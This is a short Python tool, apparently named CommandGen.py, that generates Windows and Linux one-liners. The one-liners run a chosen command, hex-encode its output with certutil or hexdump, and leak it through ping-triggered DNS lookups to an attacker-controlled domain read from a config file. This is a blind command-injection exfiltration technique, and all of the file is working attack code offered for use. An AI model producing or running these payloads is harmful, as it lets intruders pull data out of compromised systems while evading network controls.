import sys

commandTemWin = r'del new_cmd && del new_cmd.txt && command > new_cmd &&echo 11111111111>>new_cmd && certutil -encodehex new_cmd new_cmd.txt && for /f "tokens=1-17" %a in (new_cmd.txt) do start /b ping -nc 1  %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.new_cmd.{0}'
commandTemLinux = r'rm -f new_cmd;rm -f new_cmd.txt;command > new_cmd &&echo 11111111111 >>new_cmd && cat new_cmd|hexdump -C > new_cmd.txt && cat new_cmd.txt |sed s/[[:space:]]//g | cut -d "|" -f1 | cut -c 5-55| while read line;do ping -c 1 -l 1 $line.new_cmd.{0}; done'

with open('config617', 'r') as f:
    domain = f.readlines()[0]
    commandWin = commandTemWin.format(domain)
    commandLinux = commandTemLinux.format(domain)

def handle_command(cmd):
    string = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_'
    new_cmd = ''
    for i in cmd:
        if i not in string:
            continue
        new_cmd += i
    return new_cmd

if __name__ == '__main__':
    if len(sys.argv)<2:
        print('usage: python3 CommandGen.py Yourcommand No(start)')
        print('like: python3 CommandGen.py whoami (Command will use "start".Start will Send a large number of requests in a short period of time, resulting in lost DNSLog record)')
        print('like: python3 CommandGen.py whoami no (Will No start)')
        sys.exit(0)
    if len(sys.argv) == 2:
        new_cmd = handle_command(sys.argv[1])
        print("\n\nWindows:\n")
        commandWin = commandWin.replace('new_cmd',new_cmd)
        print(commandWin.replace('command',sys.argv[1]))
        print("\n\nLinux:\n")
        commandLinux = commandLinux.replace('new_cmd',new_cmd)
        print(commandLinux.replace('command',sys.argv[1]))
    if len(sys.argv) == 3:
        new_cmd = handle_command(sys.argv[1])
        print(commandWin.replace('command',sys.argv[1]).replace('start /b',''))
